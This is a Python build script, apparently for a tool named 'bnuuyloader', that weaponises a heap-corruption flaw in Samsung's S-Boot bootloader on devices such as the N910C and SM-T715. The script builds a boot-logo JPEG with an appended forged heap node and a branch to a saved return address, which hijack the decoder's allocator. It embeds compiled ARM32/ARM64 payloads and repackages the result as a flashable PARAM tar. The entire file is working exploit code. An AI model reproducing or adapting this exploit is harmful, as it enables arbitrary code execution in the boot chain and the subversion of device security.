from __future__ import annotations

import argparse
import hashlib
from io import BytesIO
from pathlib import Path
import tarfile
from tempfile import TemporaryDirectory

import numpy as np
from PIL import Image
from compiler_util import address_defines, compile_a64, compile_object, extract_binary
from payload_layout import *
from sboot_util import find_large_heap_sentinel

ROOT = Path(__file__).resolve().parent

def sha256(data: bytes) -> str:
    return hashlib.sha256(data).hexdigest()

def build_jpeg(logo_path: Path, return_target: int) -> bytearray:
    width, height = 1310, 3208
    artwork = Image.open(logo_path).convert("RGB")
    if artwork.width != width or artwork.height > 2560:
        raise ValueError("logo must be 1310 pixels wide and no more than 2560 pixels tall")
    pixels = np.empty((height, width, 3), dtype=np.uint8)
    pixels[:] = (0, 128, 128)  # Black in YCbCr.
    pixels[: artwork.height] = np.asarray(artwork.convert("YCbCr"))
    block = np.load(ROOT / "assets/jpeg_heap_header_block.npy", allow_pickle=False)
    if block.shape != (8, 8, 3) or block.dtype != np.uint8:
        raise ValueError("unexpected calibrated JPEG block")
    pixels[3200:3208, 168:176] = block
    jpg = BytesIO()
    Image.fromarray(pixels, "YCbCr").save(jpg, format="JPEG", quality=100, subsampling=0)
    result = bytearray(jpg.getvalue())
    if len(result) >= FORGED_NODE_OFFSET:
        raise ValueError("JPEG is too large: it overlaps the exploit tail")
    result.extend(bytes(FORGED_NODE_OFFSET - len(result)))
    # The decoder's large-heap split follows this forged node. Its next
    # pointer reaches the ARM32 entry through the saved return address.
    branch_delta = A32_ENTRY_ADDRESS - (FORGED_NODE_ADDRESS + 8)
    if branch_delta & 3 or not -(1 << 25) <= branch_delta < (1 << 25):
        raise ValueError("A32 entry is outside the forged node's ARM branch range")
    branch = 0xEA000000 | ((branch_delta // 4) & 0x00ffffff)
    for word in (branch, 0, 0, return_target):
        result.extend(word.to_bytes(4, "little"))
    result.extend(bytes(A64_ENTRY_OFFSET - len(result)))
    return result

def make_param(stock: bytes, crafted_logo: bytes) -> bytes:
    source, output = BytesIO(stock), BytesIO()
    with tarfile.open(fileobj=source) as src, tarfile.open(fileobj=output, mode="w") as dst:
        members = src.getmembers()
        names = [member.name for member in members]
        if names.count("logo.jpg") != 1:
            raise ValueError("stock PARAM must contain exactly one logo.jpg")
        for member in members:
            if member.isfile():
                data = crafted_logo if member.name == "logo.jpg" else src.extractfile(member).read()
                member.size = len(data)
                dst.addfile(member, BytesIO(data))
            else:
                dst.addfile(member)
    result = output.getvalue()
    if len(result) >= 8 * 1024 * 1024:
        raise ValueError("PARAM exceeds the partition's 8 MiB capacity")
    return result

def main() -> None:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--stock-param", required=True, type=Path, help="stock param.bin from the selected BL build")
    parser.add_argument("--sboot", required=True, type=Path, help="matching sboot.bin for allocator signature scan")
    parser.add_argument("--heap-base", type=lambda value: int(value, 0), default=0x24E00000,
                        help="heap base in the allocator's literal pool: 0x24E00000 on the N910C, 0x24F00000 on the SM-T715")
    parser.add_argument("--logo", type=Path, default=ROOT / "assets/logo.png")
    parser.add_argument("--output", type=Path, default=ROOT / "dist")
    args = parser.parse_args()
    args.output.mkdir(parents=True, exist_ok=True)
    stock = args.stock_param.read_bytes()
    sboot = args.sboot.read_bytes()
    return_target = find_large_heap_sentinel(sboot, args.heap_base)
    print(f"S-Boot large-heap sentinel: {return_target:#010x}")

    with TemporaryDirectory(prefix="bnuuyloader-") as temporary:
        work = Path(temporary)
        a64, main_code = compile_a64(work)
        if not main_code:
            raise ValueError("main.c produced no code")
        clean_end = MAIN_ENTRY_ADDRESS + len(main_code)
        if clean_end >= BASE_ADDRESS + STACK_GUARD_OFFSET:
            raise ValueError("main.c code is too large; keep 64 KiB clear below the EL2 stack")
        a32_obj = work / "a32_entry.o"
        compile_object(ROOT / "src/a32_entry.S", "armv8a-none-eabi", a32_obj,
                       defines={**address_defines("CACHE_CLEAN_START_ADDRESS", FORGED_NODE_ADDRESS),
                                **address_defines("CACHE_CLEAN_END_ADDRESS", clean_end),
                                **address_defines("A64_ENTRY_ADDRESS", A64_ENTRY_ADDRESS)})
        a32 = extract_binary(a32_obj, work / "a32_entry.bin")
    if len(a32) > 0x300 or len(a64) > 0xC0:
        raise ValueError("compiled code exceeds its reserved slot")
    logo = build_jpeg(args.logo, return_target)
    for offset, code, slot in ((A64_ENTRY_OFFSET, a64, 0xC0),
                               (A32_ENTRY_OFFSET, a32, 0x300)):
        logo[offset : offset + slot] = code + bytes(slot - len(code))
    logo.extend(bytes(MAIN_ENTRY_OFFSET - len(logo)))
    assert len(logo) == MAIN_ENTRY_OFFSET
    logo.extend(main_code)
    if len(logo) > 0x100000:
        raise ValueError("payload exceeds mapped JPEG buffer")

    param = make_param(stock, bytes(logo))
    raw_path = args.output / "param.bin"
    raw_path.write_bytes(param)
    tar_path = args.output / "PARAM_bnuuyloader.tar"
    with tarfile.open(tar_path, mode="w", format=tarfile.USTAR_FORMAT) as dst:
        member = tarfile.TarInfo("param.bin")
        member.size = len(param)
        member.mode = 0o644
        dst.addfile(member, BytesIO(param))
    with tarfile.open(tar_path) as check:
        members = check.getmembers()
        assert len(members) == 1 and members[0].name == "param.bin"
        assert check.extractfile(members[0]).read() == param
    for path in (raw_path, tar_path):
        print(f"{path}: {path.stat().st_size} bytes, SHA-256 {sha256(path.read_bytes())}")

if __name__ == "__main__":
    main()
